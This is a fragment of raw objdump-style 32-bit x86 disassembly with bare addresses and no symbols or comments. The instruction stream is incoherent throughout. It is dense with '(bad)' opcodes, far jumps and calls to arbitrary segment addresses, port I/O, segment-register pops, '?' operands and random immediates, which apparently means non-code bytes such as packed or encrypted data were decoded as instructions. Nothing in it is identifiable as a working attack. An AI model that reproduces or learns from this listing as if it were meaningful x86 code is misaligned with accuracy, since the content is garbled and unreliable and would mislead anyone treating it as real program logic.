  407a9b:	jb     0x407b1b
  407a9d:	push   ds
  407a9e:	jne    0x407ad4
  407aa0:	jle    0x407a7e
  407aa2:	add    DWORD PTR [edx+0x7b],0x1fba09f6
  407aa9:	lahf   
  407aaa:	sar    ch,1
  407aac:	pop    ss
  407aad:	xchg   esi,eax
  407aae:	adc    eax,0x6ac60905
  407ab3:	fsub   QWORD PTR [ebx]
  407ab5:	shl    DWORD PTR [ebx-0x32],1
  407ab8:	je     0x407a51
  407aba:	bound  eax,QWORD PTR [ebp+0x1356a030]
  407ac0:	lahf   
  407ac1:	push   0x6b
  407ac3:	jl     0x407a53
  407ac5:	push   0x4e
  407ac7:	xor    al,0x7e
  407ac9:	mov    esi,0x5879f384
  407ace:	int    0x31
  407ad0:	push   esi
  407ad1:	and    eax,0x78db0463
  407ad6:	add    ebx,DWORD PTR [edi+ecx*2]
  407ad9:	xchg   edx,eax
  407ada:	pop    esp
  407adb:	mul    BYTE PTR [ebp+0x6283e6e2]
  407ae1:	or     DWORD PTR [esi+0x31a7cd2d],eax
  407ae7:	cli    
  407ae8:	shr    BYTE PTR [edi],0x9
  407aeb:	push   ebx
  407aec:	ret    0xb33e
  407aef:	mov    edx,ds
  407af1:	and    dh,BYTE PTR [ebp-0x52e3cfd2]
  407af7:	jns    0x407b74
  407af9:	les    ebp,FWORD PTR [ebp+edx*2-0x4b]
  407afd:	mov    esp,0xf8cb167c
  407b02:	push   cs
  407b03:	and    eax,0xaaffd700
  407b08:	sar    DWORD PTR [esi+0x559779ad],cl
  407b0e:	mov    BYTE PTR [ebx+0x1c7c5dbf],dl
  407b14:	xor    eax,0x26756a48
  407b19:	add    BYTE PTR [edx+0x793d5ee5],0x8e
  407b20:	mov    ebp,DWORD PTR ds:0x237ba884
  407b26:	shl    dl,0x7e
  407b29:	adc    DWORD PTR [esi+ebp*2],esi
  407b2c:	and    eax,0x76921db9
  407b31:	lods   eax,DWORD PTR ds:[esi]
  407b32:	xor    DWORD PTR [ebx+0x5f73a332],0x678acf8a
  407b3c:	ins    BYTE PTR es:[edi],dx
  407b3d:	enter  0xd2d8,0xaf
  407b41:	xlat   BYTE PTR ds:[ebx]
  407b42:	push   ss
  407b43:	push   edx
  407b44:	push   ecx
  407b45:	test   al,0x18
  407b47:	in     eax,dx
  407b48:	dec    ebp
  407b49:	mov    ebx,0xf420a959
  407b4e:	sub    DWORD PTR [edi],edi
  407b50:	nop
  407b51:	or     DWORD PTR [edx-0x18ca2b97],eax
  407b57:	inc    ebx
  407b58:	fmul   st,st(4)
  407b5a:	push   esp
  407b5b:	mov    esi,DWORD PTR [esi+0x35]
  407b5e:	or     eax,0x9b1dec91
  407b63:	div    ebx
  407b65:	call   0x60c6:0x147a355e
  407b6c:	outs   dx,DWORD PTR ds:[esi]
  407b6d:	cs sti 
  407b6f:	mov    ebp,0x8a1c2639
  407b74:	sbb    DWORD PTR [edx],0x3219c645
  407b7a:	lods   eax,DWORD PTR ds:[esi]
  407b7b:	mov    bl,0x3e
  407b7d:	xchg   edx,eax
  407b7e:	push   0xaaf2693e
  407b83:	push   esp
  407b84:	dec    esi
  407b85:	xor    eax,0x19980c2e
  407b8a:	xchg   BYTE PTR [edi+0x43],al
  407b8d:	mov    ds:0x56672021,eax
  407b92:	pop    ss
  407b93:	scas   eax,DWORD PTR es:[edi]
  407b94:	push   ecx
  407b95:	sahf   
  407b96:	jmp    0xf5a5:0xdc11c0
  407b9d:	jmp    0x3f3b:0x25f34304
  407ba4:	dec    edx
  407ba5:	repz mov ds:0x1200341c,eax
  407bab:	lods   al,BYTE PTR ds:[esi]
  407bac:	jbe    0x407b63
  407bae:	jmp    0x407b93
  407bb0:	inc    ecx
  407bb1:	mov    ecx,0x8745cfec
  407bb6:	stos   BYTE PTR es:[edi],al
  407bb7:	jge    0x407b6c
  407bb9:	rcl    esi,1
  407bbb:	adc    ecx,ecx
  407bbd:	xchg   edi,eax
  407bbe:	adc    edx,edi
  407bc0:	xchg   esi,eax
  407bc1:	fnstenv [ecx+0x509bc9bb]
  407bc7:	mov    bl,0x4b
  407bc9:	cs xchg ebx,eax
  407bcb:	or     eax,0x60a06342
  407bd0:	out    0x88,eax
  407bd2:	aaa    
  407bd3:	into   
  407bd4:	adc    bh,BYTE PTR [esi]
  407bd6:	in     eax,0xa2
  407bd8:	daa    
  407bd9:	and    al,0xe4
  407bdb:	or     bl,BYTE PTR [edx-0x29]
  407bde:	mov    eax,ds:0x8021187e
  407be3:	adc    BYTE PTR [ebp-0x6a],cl
  407be6:	ret    0x31be
  407be9:	dec    eax
  407bea:	sub    DWORD PTR [ebx],0x5cec4b69
  407bf0:	call   0x2f9f582a
  407bf5:	mov    ah,0x90
  407bf7:	sub    al,0x12
  407bf9:	pop    eax
  407bfa:	ss jle 0x407bd5
  407bfd:	pop    ds
  407bfe:	test   al,0xb
  407c00:	rol    BYTE PTR [ebx],1
  407c02:	or     esp,DWORD PTR [ecx+0x1d1caad0]
  407c08:	sub    DWORD PTR [ecx+0x32d9f1e9],0xd0b8e393
  407c12:	jno    0x407b9c
  407c14:	out    dx,eax
  407c15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407c16:	cs in  al,0xe7
  407c19:	ins    BYTE PTR es:[edi],dx
  407c1a:	not    ecx
  407c1c:	mov    edx,0x26ca2fc4
  407c21:	pop    ss
  407c22:	pop    esi
  407c23:	ja     0x407c61
  407c25:	adc    esi,esp
  407c27:	scas   eax,DWORD PTR es:[edi]
  407c28:	js     0x407c6c
  407c2a:	or     al,BYTE PTR fs:[ebx]
  407c2d:	in     eax,0x45
  407c2f:	sar    DWORD PTR [ecx+0x67ab7336],1
  407c35:	aas    
  407c36:	mov    dl,0x30
  407c38:	stos   DWORD PTR es:[edi],eax
  407c39:	pushf  
  407c3a:	test   DWORD PTR [edi],ebp
  407c3c:	cdq    
  407c3d:	repz pop ebx
  407c3f:	mov    ds:0xeab6ac41,eax
  407c44:	push   ebx
  407c45:	(bad)  
  407c47:	jo     0x407c8e
  407c49:	imul   eax,DWORD PTR [edx-0x22],0xffffff93
  407c4d:	cmp    eax,0x3a8babb9
  407c52:	jmp    0x7b21:0xea0b9bc4
  407c59:	pop    esi
  407c5a:	ja     0x407c3d
  407c5c:	outs   dx,BYTE PTR ds:[esi]
  407c5d:	clc    
  407c5e:	xchg   edx,eax
  407c5f:	aaa    
  407c60:	sbb    eax,DWORD PTR [esi]
  407c62:	mov    ecx,0xb3776d47
  407c67:	xchg   ebp,eax
  407c68:	add    al,al
  407c6a:	shr    eax,1
  407c6c:	jecxz  0x407c36
  407c6e:	push   0xcaeb41a4
  407c73:	sbb    al,0xde
  407c75:	pop    edx
  407c76:	sub    BYTE PTR [edi-0x9],ch
  407c79:	mov    ah,BYTE PTR [edi]
  407c7b:	les    eax,FWORD PTR [esp+ebx*2]
  407c7e:	push   eax
  407c7f:	push   0x16
  407c81:	(bad)  
  407c82:	xor    bl,dh
  407c84:	add    ecx,DWORD PTR [ecx]
  407c86:	jb     0x407c14
  407c88:	jno    0x407cca
  407c8a:	xor    al,0xf0
  407c8c:	aam    0xc5
  407c8e:	fisub  DWORD PTR [edi-0x23]
  407c91:	push   cs
  407c92:	ret    
  407c93:	stc    
  407c94:	pop    es
  407c95:	fiadd  WORD PTR [eax+ebx*1-0x4ce9dc02]
  407c9c:	or     DWORD PTR [edx-0x274450c5],0xc5459ee
  407ca6:	lea    ebx,[edx-0x1979aea9]
  407cac:	in     eax,dx
  407cad:	addr16 adc al,0x7f
  407cb0:	adc    DWORD PTR [eax-0x13],eax
  407cb3:	add    BYTE PTR [ebx+0x7bc3de9a],0xa8
  407cba:	int    0x18
  407cbc:	dec    esi
  407cbd:	dec    DWORD PTR [eax]
  407cbf:	sbb    BYTE PTR [ecx],dh
  407cc1:	imul   esp,DWORD PTR [edi],0xffffffe2
  407cc4:	and    DWORD PTR [ecx+0x24],edi
  407cc7:	test   al,0xcf
  407cc9:	or     bl,dl
  407ccb:	sub    BYTE PTR [edx+edi*8],0xca
  407ccf:	pop    ecx
  407cd0:	pop    esp
  407cd1:	or     eax,0x8669310b
  407cd6:	pop    esi
  407cd7:	idiv   BYTE PTR [edi+edi*2-0x49]
  407cdb:	push   ebp
  407cdc:	jmp    0xe2a480db
  407ce1:	xchg   edx,eax
  407ce2:	add    al,0xa3
  407ce4:	mov    ecx,DWORD PTR [ecx]
  407ce6:	sbb    eax,0xfccf5413
  407ceb:	sbb    esp,DWORD PTR [ebp+0x1683724f]
  407cf1:	retf   0x2a0f
  407cf4:	xor    bh,ch
  407cf6:	jp     0x407cb0
  407cf8:	jne    0x407cdf
  407cfa:	adc    DWORD PTR [ebx],0x729a7fea
  407d00:	fwait
  407d01:	mov    ?,WORD PTR [ebx+0x77896d9a]
  407d07:	sbb    DWORD PTR [esi],eax
  407d09:	sub    edi,ecx
  407d0b:	pop    ss
  407d0c:	js     0x407d32
  407d0e:	sbb    ax,0xa7c4
  407d12:	push   cs
  407d13:	or     dl,BYTE PTR [esi+0x1131afd7]
  407d19:	inc    ebp
  407d1a:	mov    ch,BYTE PTR [esi]
  407d1c:	jae    0x407d63
  407d1e:	out    dx,eax
  407d1f:	popa   
  407d20:	dec    ebp
  407d21:	dec    ecx
  407d22:	out    0x27,al
  407d24:	lds    edx,FWORD PTR [edi-0x6]
  407d27:	ss enter 0xf3c7,0xc9
  407d2c:	in     al,0xd1
  407d2e:	test   eax,0x52c499b3
  407d33:	cli    
  407d34:	cwde   
  407d35:	mov    edx,0xb3a3da13
  407d3a:	std    
  407d3b:	in     eax,dx
  407d3c:	cld    
  407d3d:	(bad)  
  407d3e:	stc    
  407d3f:	xchg   ebp,eax
  407d40:	adc    cl,dl
  407d42:	ins    BYTE PTR es:[edi],dx
  407d43:	push   eax
  407d44:	iret   
  407d45:	std    
  407d46:	mov    BYTE PTR [eax],bl
  407d48:	add    edx,DWORD PTR [ebp+eiz*2+0x72ce1e4f]
  407d4f:	imul   ebx,DWORD PTR [ebx+0x3d0474e8],0xee032786
  407d59:	add    ebp,DWORD PTR [ebx-0x67ac9f72]
  407d5f:	push   edx
  407d60:	pop    eax
  407d61:	push   ss
  407d62:	ins    BYTE PTR es:[edi],dx
  407d63:	clc    
  407d64:	xchg   esp,eax
  407d65:	inc    BYTE PTR [ebx]
  407d67:	cli    
  407d68:	or     al,0xfc
  407d6a:	push   ss
  407d6b:	lods   eax,DWORD PTR ds:[esi]
  407d6c:	test   edx,esp
  407d6e:	mov    ch,0x6
  407d70:	mov    al,ds:0xab99f815
  407d75:	mov    dh,bh
  407d77:	popf   
  407d78:	fwait
  407d79:	add    ch,ch
  407d7b:	out    0x7b,al
  407d7d:	test   DWORD PTR [edx],0xfb838059
  407d83:	int3   
  407d84:	fs pop es
  407d86:	mov    dl,BYTE PTR [eax+0x7]
  407d89:	push   es
  407d8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407d8b:	adc    DWORD PTR [ebx-0x1b],edx
  407d8e:	inc    ebx
  407d8f:	ss mov edx,0x685a23ec
  407d95:	arpl   WORD PTR [esi],bp
  407d97:	fdiv   QWORD PTR [ebp+0x5d]
  407d9a:	cli    
  407d9b:	call   0xcc7f:0x98bcc01e
  407da2:	sub    ebx,0xffffffb7
  407da5:	cli    
  407da6:	int    0xc9
  407da8:	stc    
  407da9:	pusha  
  407daa:	dec    edi
  407dab:	pop    ds
  407dac:	pusha  
  407dad:	mov    edx,0xdbc9fc8f
  407db2:	mov    cl,0x23
  407db4:	inc    edx
  407db5:	scas   eax,DWORD PTR es:[edi]
  407db6:	icebp  
  407db7:	add    eax,0x518da810
  407dbc:	mov    BYTE PTR cs:[esi],al
  407dbf:	jle    0x407dd7
  407dc1:	nop
  407dc2:	sbb    eax,DWORD PTR [edx]
  407dc4:	scas   al,BYTE PTR es:[edi]
  407dc5:	mov    dl,0x41
  407dc7:	and    al,0x8e
  407dc9:	out    0x8c,al
  407dcb:	cwde   
  407dcc:	mov    dl,0xba
  407dce:	arpl   dx,di
  407dd0:	dec    esi
  407dd1:	retf   
  407dd2:	nop
  407dd3:	pop    esp
  407dd4:	cld    
  407dd5:	cli    
  407dd6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407dd7:	sub    esp,DWORD PTR [esi]
  407dd9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407dda:	and    bl,BYTE PTR [edi+0x7a]
  407ddd:	jmp    0xc2ad720e
  407de2:	push   ss
  407de3:	mov    cl,0x59
  407de5:	es in  al,dx
  407de7:	(bad)  
  407de8:	imul   esp,DWORD PTR [esi],0x78
  407deb:	(bad)  
  407dec:	jae    0x407d8a
  407dee:	adc    dh,ah
  407df0:	cld    
  407df1:	call   0x9c42:0xc63cb6b3
  407df8:	pop    esp
  407df9:	mov    bl,dl
  407dfb:	add    DWORD PTR [ebx+0x4bb94a3e],0x20
  407e02:	hlt    
  407e03:	jp     0x407e6b
  407e05:	push   0x1311280b
  407e0a:	enter  0x4dad,0xf
  407e0e:	mov    esp,0x9f1e0b31
  407e13:	fisubr WORD PTR [edx-0x20]
  407e16:	or     eax,0x89418b63
  407e1b:	or     BYTE PTR [edx-0x78],dl
  407e1e:	push   edi
  407e1f:	(bad)  
  407e21:	xor    BYTE PTR [edx-0x73],cl
  407e24:	lods   al,BYTE PTR ds:[esi]
  407e25:	lock sub edi,ebx
  407e28:	fidivr WORD PTR [edi-0x7582ecac]
  407e2e:	mov    cl,0xd0
  407e30:	ret    0x3f5c
  407e33:	pop    eax
  407e34:	xchg   edi,eax
  407e35:	mov    cl,0x85
  407e37:	test   eax,0x68ede2c4
  407e3c:	into   
  407e3d:	jge    0x407e82
  407e3f:	stc    
  407e40:	scas   eax,DWORD PTR es:[edi]
  407e41:	dec    eax
  407e42:	push   ds
  407e43:	pop    eax
  407e44:	push   ebx
  407e45:	sbb    ebp,edi
  407e47:	and    eax,DWORD PTR [eax]
  407e49:	idiv   DWORD PTR [edi-0x5cfd5ed7]
  407e4f:	xor    ebx,esp
  407e51:	pop    esp
  407e52:	pop    ss
  407e53:	and    DWORD PTR [ebx+esi*8+0x2f],ebp
  407e57:	inc    eax
  407e58:	out    dx,eax
  407e59:	jmp    0x972001bd
  407e5e:	and    BYTE PTR [edi],al
  407e60:	push   esp
  407e61:	loopne 0x407e8d
  407e63:	stos   BYTE PTR es:[edi],al
  407e64:	push   0xc1353229
  407e69:	xlat   BYTE PTR ds:[ebx]
  407e6a:	push   ecx
  407e6b:	or     edx,edx
  407e6d:	pushf  
  407e6e:	cmp    DWORD PTR [eax],edi
  407e70:	fst    st(6)
  407e72:	push   ecx
  407e73:	mov    al,ds:0x744a04f5
  407e78:	gs ins BYTE PTR es:[edi],dx
  407e7a:	pop    es
  407e7b:	adc    al,0xbb
  407e7d:	imul   esp,DWORD PTR [eax+0x18c2a6a5],0x74c30e7d
  407e87:	cld    
  407e88:	xor    BYTE PTR [ebp+0x4b787ea2],al
  407e8e:	(bad)  
  407e8f:	in     eax,dx
  407e90:	cmp    BYTE PTR [esi],0xd6
  407e93:	xchg   ebx,eax
  407e94:	jbe    0x407eb8
  407e96:	into   
  407e97:	and    al,0x2c
  407e99:	xchg   ebp,eax
  407e9a:	cmp    al,0xfd
  407e9c:	push   ebx
  407e9d:	mov    ebp,0x173f74af
  407ea2:	scas   eax,DWORD PTR es:[edi]
  407ea3:	and    edx,DWORD PTR [esi-0x21]
  407ea6:	ror    BYTE PTR [ebx],1
  407ea8:	(bad)  
  407eaa:	jle    0x407eea
  407eac:	sub    al,0xf0
  407eae:	sub    al,BYTE PTR [edx+ebx*2-0x1e]
  407eb2:	pushf  
  407eb3:	fisttp WORD PTR [ecx-0x74793793]
  407eb9:	dec    ebx
  407eba:	push   ecx
  407ebb:	(bad)  
  407ebd:	(bad)  
  407ebe:	push   ds
  407ebf:	jbe    0x407ebd
  407ec1:	sahf   
  407ec2:	bound  edi,QWORD PTR [edi+edx*1]
  407ec5:	xchg   ebp,eax
  407ec6:	jne    0x407e8b
  407ec8:	in     eax,0xee
  407eca:	aas    
  407ecb:	pop    ebx
  407ecc:	mov    cl,0x9f
  407ece:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407ecf:	push   0x4c4226a4
  407ed4:	add    edx,ebx
  407ed6:	out    0x18,eax
  407ed8:	pop    ss
  407ed9:	dec    eax
  407eda:	scas   eax,DWORD PTR es:[edi]
  407edb:	pop    ebx
  407edc:	repnz int 0xe9
  407edf:	hlt    
  407ee0:	lods   eax,DWORD PTR ds:[esi]
  407ee1:	adc    esi,eax
  407ee3:	arpl   WORD PTR [ebp-0x1],bx
  407ee6:	aad    0x9a
  407ee8:	jns    0x407ea6
  407eea:	push   0x11e95a96
  407eef:	xor    al,0x33
  407ef1:	xor    BYTE PTR [esi+esi*1-0x4667d3d4],0xeb
  407ef9:	adc    ch,bl
  407efb:	sbb    al,0x7
  407efd:	aad    0x68
  407eff:	scas   al,BYTE PTR es:[edi]
  407f00:	jnp    0x407ef1
  407f02:	retf   
  407f03:	adc    DWORD PTR [eax+0x6b2e2be7],ebp
  407f09:	pop    edi
  407f0a:	sbb    BYTE PTR [edx],ah
  407f0c:	dec    ecx
  407f0d:	nop
  407f0e:	xlat   BYTE PTR ds:[ebx]
  407f0f:	shl    DWORD PTR [ebx],1
  407f11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407f12:	sahf   
  407f13:	ja     0x407f5d
  407f15:	mov    edx,0x8b1ccdb7
  407f1a:	push   ds
  407f1b:	mov    cl,0xe9
  407f1d:	adc    BYTE PTR [ecx+edx*2-0x69d55b73],0x14
  407f25:	bound  esp,QWORD PTR ds:0x41cf3611
  407f2b:	test   BYTE PTR ds:0x4a44076c,al
  407f31:	adc    DWORD PTR [edi],eax
  407f33:	cmp    BYTE PTR [esi-0x70],al
  407f36:	and    al,0xa4
  407f38:	outs   dx,BYTE PTR ds:[esi]
  407f39:	mov    al,0x6b
  407f3b:	stc    
  407f3c:	iret   
  407f3d:	jo     0x407f0c
  407f3f:	and    BYTE PTR [ecx],dl
  407f41:	push   ss
  407f42:	call   0xfaf8:0xb34dd461
  407f49:	retf   0x358a
  407f4c:	sbb    dh,BYTE PTR [edx]
  407f4e:	repnz xchg ebx,eax
  407f50:	inc    BYTE PTR [ebx-0x4b]
  407f53:	dec    ecx
  407f54:	xchg   esp,eax
  407f55:	pop    es
  407f56:	or     ebx,DWORD PTR [esi]
  407f58:	pop    ecx
  407f59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407f5a:	adc    eax,0xed6d416d
  407f5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407f60:	cld    
  407f61:	mov    al,0xfa
  407f63:	mov    ah,0x50
  407f65:	add    ah,BYTE PTR [ecx-0x14]
  407f68:	aaa    
  407f69:	sub    edx,eax
  407f6b:	ror    DWORD PTR [ecx+0x2229265],0x46
  407f72:	cli    
  407f73:	imul   eax,DWORD PTR [ebx-0x72],0xffffffa3
  407f77:	fisttp WORD PTR [ebp+0x58]
  407f7a:	lods   eax,DWORD PTR ds:[esi]
  407f7b:	leave  
  407f7c:	push   ecx
  407f7d:	xor    eax,0xc726e5b3
  407f82:	add    al,0x27
  407f84:	jae    0x407fb9
  407f86:	(bad)  
  407f87:	mov    dh,0x56
  407f89:	sbb    DWORD PTR [esi+ebp*2],ecx
  407f8c:	mov    esp,0x207846e6
  407f91:	in     al,0xef
  407f93:	in     eax,0xe
  407f95:	(bad)  
  407f97:	ror    BYTE PTR [esi],0xa6
  407f9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407f9b:	lea    esi,[esi-0x5fc0d470]
  407fa1:	div    DWORD PTR [eax-0x1c]
  407fa4:	jb     0x40801b
  407fa6:	arpl   WORD PTR [edx+0x67],sp
  407fa9:	jmp    0xb53c:0xc0b47d13
  407fb0:	mov    ebp,0xcf02645b
  407fb5:	and    DWORD PTR [ecx+0x6],esi
  407fb8:	mov    al,0x72
  407fba:	mov    ah,0xd1
  407fbc:	jmp    0x2574:0x864b68e5
  407fc3:	mul    DWORD PTR [edi*2-0x1fd5cdb3]
  407fca:	bound  ecx,QWORD PTR [ebx+0x42]
  407fcd:	inc    eax
  407fce:	mov    eax,cs
  407fd0:	fcomip st,st(6)
  407fd2:	jl     0x407fc9
  407fd4:	nop
  407fd5:	retf   0x1bbb
  407fd8:	push   edx
  407fd9:	inc    esp
  407fda:	ficomp WORD PTR ds:0xbeded32e
  407fe0:	cmp    al,0xec
  407fe2:	push   edi
  407fe3:	mov    dl,bl
  407fe5:	sbb    al,0x93
  407fe7:	dec    esp
  407fe8:	mov    esi,0xc4cfd059
  407fed:	or     edx,esp
  407fef:	push   cs
  407ff0:	lods   eax,DWORD PTR ds:[esi]
  407ff1:	into   
  407ff2:	ja     0x40805f
  407ff4:	std    
  407ff5:	push   esp
  407ff6:	inc    ebp
  407ff7:	ss push ds
  407ff9:	ja     0x407fe7
  407ffb:	out    0x3,al
  407ffd:	(bad)  
  407ffe:	jno    0x40801e
  408000:	and    bl,cl
  408002:	mov    al,0x88
  408004:	retf   
  408005:	hlt    
  408006:	push   edx
  408007:	and    al,0x82
  408009:	rcr    DWORD PTR [edx],cl
  40800b:	leave  
  40800c:	cld    
  40800d:	in     al,dx
  40800e:	cmp    dl,BYTE PTR [ebx]
  408010:	inc    ebp
  408011:	jg     0x407ffe
  408013:	imul   esp,ebp,0xffffffcc
  408016:	out    0xd7,al
  408018:	enter  0xc3f3,0x13
  40801c:	jae    0x408068
  40801e:	gs mov ah,0x77
  408021:	inc    ebx
  408022:	ret    0x29b8
  408025:	fucomp st(4)
  408027:	mov    ah,BYTE PTR [edx-0x59]
  40802a:	jle    0x40806c
  40802c:	test   eax,0xa2836bf3
  408031:	inc    esp
  408032:	mov    edi,0x801f5841
  408037:	hlt    
  408038:	adc    al,dl
  40803a:	xlat   BYTE PTR ds:[ebx]
  40803b:	pop    ebx
  40803c:	push   cs
  40803d:	push   ecx
  40803e:	aas    
  40803f:	mov    eax,0x5a7eb529
  408044:	xchg   DWORD PTR [ecx+ebx*4+0x39],ebp
  408048:	xor    al,0xb0
  40804a:	sub    DWORD PTR [edi+0x3202c9f7],edx
  408050:	fidiv  DWORD PTR [ecx-0x6e]
  408053:	jp     0x408089
  408055:	jecxz  0x408025
  408057:	inc    esi
  408058:	pop    es
  408059:	stc    
  40805a:	fadd   DWORD PTR [edi+0x458d4c1c]
  408060:	imul   esp,esp,0x40561bdf
  408066:	jl     0x40801d
  408068:	sub    al,0x4e
  40806a:	mov    ch,dh
  40806c:	out    0x53,al
  40806e:	add    bl,BYTE PTR [eax]
  408070:	jg     0x40805f
  408072:	(bad)  
  408073:	cmp    al,0xaa
  408075:	push   eax
  408076:	ins    DWORD PTR es:[edi],dx
  408077:	mov    BYTE PTR [edx-0x593a3570],bl
  40807d:	out    0xf2,eax
  40807f:	xchg   esp,eax
  408080:	sbb    esp,edi
  408082:	jp     0x408016
  408084:	in     al,0x29
  408086:	in     al,0xda
  408088:	inc    edi
  408089:	test   al,0x35
  40808b:	cmp    al,0x24
  40808d:	pop    eax
  40808e:	jo     0x408097
  408090:	retf   
  408091:	add    dh,BYTE PTR [esi+0x140435ba]
  408097:	in     eax,0x80
  408099:	adc    eax,0xf806ba43
  40809e:	or     al,0xde
  4080a0:	xchg   esi,eax
  4080a1:	popf   
  4080a2:	dec    edi
  4080a3:	dec    edi
  4080a4:	cdq    
  4080a5:	clc    
  4080a6:	mov    BYTE PTR [eax-0x2c4200b8],0x32
  4080ad:	sbb    al,0xc3
  4080af:	into   
  4080b0:	push   cs
  4080b1:	or     ebp,esp
  4080b3:	sbb    eax,0xc5104118
  4080b8:	cld    
  4080b9:	push   esp
  4080ba:	rol    al,cl
  4080bc:	adc    BYTE PTR [edi+0x56b5ea55],ch
  4080c2:	sbb    al,0x6c
  4080c4:	xor    esp,eax
  4080c6:	in     al,dx
  4080c7:	sbb    eax,esp
  4080c9:	cmp    al,0xa8
  4080cb:	scas   eax,DWORD PTR es:[edi]
  4080cc:	inc    edx
  4080cd:	repz sub ah,ch
  4080d0:	out    dx,al
  4080d1:	hlt    
  4080d2:	iret   
  4080d3:	cwde   
  4080d4:	and    cl,BYTE PTR [edi+0x33]
  4080d7:	scas   al,BYTE PTR es:[edi]
  4080d8:	push   esi
  4080d9:	and    DWORD PTR [ebx],esi
  4080db:	xchg   esp,eax
  4080dc:	xchg   esi,eax
  4080dd:	loope  0x40811f
  4080df:	cmovns edx,DWORD PTR [esi+eax*8+0x2c]
  4080e4:	sub    edx,DWORD PTR ds:0x39c92323
  4080ea:	rcr    dl,1
  4080ec:	xchg   ecx,eax
  4080ed:	dec    BYTE PTR ds:0x3ccc70df
  4080f3:	shr    DWORD PTR [edi+0x11],0xab
  4080f7:	jmp    0x99a7:0x7cd37883
  4080fe:	pop    ecx
  4080ff:	popa   
  408100:	xchg   BYTE PTR ds:0x93228528,cl
  408106:	bswap  ecx
  408108:	lahf   
  408109:	or     ebp,ecx
  40810b:	mov    DWORD PTR [eax+0x62],edi
  40810e:	data16 loope 0x408158
  408111:	mul    al
  408113:	adc    bl,al
  408115:	repnz (bad) 
  408118:	mov    edx,0xdc49330c
  40811d:	sbb    eax,0xc91b2198
  408122:	or     eax,0x35050aed
  408127:	rcl    BYTE PTR [ebp+edi*2+0x7],1
  40812b:	dec    ebx
  40812c:	mov    ?,edx
  40812e:	jge    0x40812e
  408130:	or     al,0x4c
  408132:	inc    edi
  408133:	stos   BYTE PTR es:[edi],al
  408134:	add    BYTE PTR [esi-0x5b],bh
  408137:	shr    DWORD PTR [edx-0x61d660da],cl
  40813d:	ror    ah,0x54
  408140:	(bad)  
  408141:	pop    edi
  408142:	inc    edx
  408143:	xchg   DWORD PTR [ebx],edi
  408145:	leave  
  408146:	inc    edi
  408147:	inc    edi
  408148:	pop    esp
  408149:	mov    edi,0xbe991a0c
  40814e:	mov    BYTE PTR [ecx+edx*1-0x4ef7db12],dh
  408155:	cli    
  408156:	mov    cl,0x39
  408158:	sbb    eax,DWORD PTR [ecx]
  40815a:	jnp    0x4081c8
  40815c:	scas   al,BYTE PTR es:[edi]
  40815d:	rep lods eax,DWORD PTR ds:[esi]
  40815f:	mov    ds:0x338e3a4e,eax
  408164:	cmp    ebx,DWORD PTR [esp+edi*8-0x1e]
  408168:	sahf   
  408169:	fcomp  QWORD PTR [eax+0x46]
  40816c:	inc    esi
  40816d:	ret    
  40816e:	xchg   esi,eax
  40816f:	nop
  408170:	addr16 inc edx
  408172:	or     al,0x4f
  408174:	stc    
  408175:	fucom  st(5)
  408177:	shr    DWORD PTR [edi+0x4f],1
  40817a:	jmp    0x38dcc90b
  40817f:	push   cs
  408180:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408181:	xchg   ebx,eax
  408182:	adc    BYTE PTR [edi+ebp*1+0x37],dh
  408186:	inc    edi
  408187:	sbb    bh,dl
  408189:	and    dl,BYTE PTR [edx+0x22]
  40818c:	ins    BYTE PTR es:[edi],dx
  40818d:	loopne 0x4081f0
  40818f:	xor    bl,ch
  408191:	imul   ecx,esi,0x2c
  408194:	mov    edx,0xfe8b0c00
  408199:	and    al,cl
  40819b:	xchg   BYTE PTR [ebx-0x17],dl
  40819e:	sub    ch,BYTE PTR [ecx+ebp*8]
  4081a1:	jle    0x40820f
  4081a3:	and    esp,ebx
  4081a5:	bound  eax,QWORD PTR [edx]
  4081a7:	pop    es
  4081a8:	pop    ebx
  4081a9:	mov    esp,0x452cda45
  4081ae:	ins    BYTE PTR es:[edi],dx
  4081af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4081b0:	sbb    ah,BYTE PTR [ecx+0x225715e9]
  4081b6:	sar    BYTE PTR [ebx+0x34],0x6b
  4081ba:	push   ebp
  4081bb:	adc    DWORD PTR [edx+0x19],esp
  4081be:	mov    edi,0x67b9cfda
  4081c3:	fs int 0x17
  4081c6:	leave  
  4081c7:	push   ss
  4081c8:	dec    eax
  4081c9:	iret   
  4081ca:	and    al,0x57
  4081cc:	or     edi,DWORD PTR [esi+ecx*1+0x72b48f51]
  4081d3:	aad    0x8b
  4081d5:	inc    edi
  4081d6:	sub    edi,DWORD PTR [edi+edi*4]
  4081d9:	out    dx,eax
  4081da:	mov    al,ds:0x30669a1
  4081df:	aad    0xff
  4081e1:	mov    al,ds:0x48ef19c9
  4081e6:	cdq    
  4081e7:	lods   eax,DWORD PTR ds:[esi]
  4081e8:	rcr    ecx,1
  4081ea:	jne    0x4081fa
  4081ec:	push   ecx
  4081ed:	loope  0x40819a
  4081ef:	mov    edi,0x40ff0875
  4081f4:	outs   dx,BYTE PTR ds:[esi]
  4081f5:	dec    edx
  4081f6:	stos   DWORD PTR es:[edi],eax
  4081f7:	fs jg  0x4081a7
  4081fa:	sbb    dh,BYTE PTR [edx-0x6c9f07c8]
  408200:	mov    ebx,0x2b13359f
  408205:	ret    
  408206:	std    
  408207:	out    0xc6,eax
  408209:	pop    ebx
  40820a:	retf   0xb2c6
  40820d:	nop
  40820e:	scas   eax,DWORD PTR es:[edi]
  40820f:	retf   0xd37d
  408212:	fidivr WORD PTR [edx+0x10]
  408215:	int    0x41
  408217:	fwait
  408218:	xor    eax,0x5b6b5162
  40821d:	sub    BYTE PTR [edi+ebp*8+0x7f],bh
  408221:	mov    ds:0x4d3e5717,eax
  408226:	xor    eax,esi
  408228:	push   esp
  408229:	pop    ss
  40822a:	aad    0xb9
  40822c:	and    al,BYTE PTR [ebx+edi*1-0x21490075]
  408233:	popf   
  408234:	push   ebp
  408235:	sbb    ah,BYTE PTR [edi]
